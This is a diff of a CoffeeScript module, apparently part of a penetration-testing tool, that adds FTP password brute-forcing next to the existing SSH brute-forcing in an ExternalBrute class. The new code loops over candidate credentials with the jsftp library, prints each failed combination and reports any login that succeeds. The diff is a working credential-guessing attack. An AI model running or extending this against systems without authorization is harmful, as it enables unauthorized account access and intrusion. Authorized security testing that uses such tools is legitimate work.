@@ -111,7 +111,6 @@ class ExternalBrute extends EventEmitter
 						Printer.highlight "Last tested combination "
 						Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
 						Printer.removeCursor()
-
 				sshO =
 					host: target
 					port: port
@@ -124,7 +123,25 @@ class ExternalBrute extends EventEmitter
 
 				setTimeout callback, timeOut
 				c.connect sshO
+			when "sftp"
+				JSFtp = require("jsftp")
+				ftpO =
+					host: target
+					port: parseInt port,10 # defaults to 21
+					user: testUser # defaults to "anonymous"
+					pass: testPass # defaults to "@anonymous"
+				Ftp = new JSFtp(ftpO)
 
+				Ftp.auth ftpO.user, ftpO.pass, (err) ->
+					if err
+						if /Login not accepted/.exec err
+							Printer.highlight "Last tested combination "
+							Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+							Printer.removeCursor()
+						else
+							Printer.error "ExternalBrute: Connection problem #{err}"
+					else
+						printBrutePass testUser, testPass
 
 	brute = (target, port, testUser, passwords, delay, type) =>
 		# File with passwords is provided.
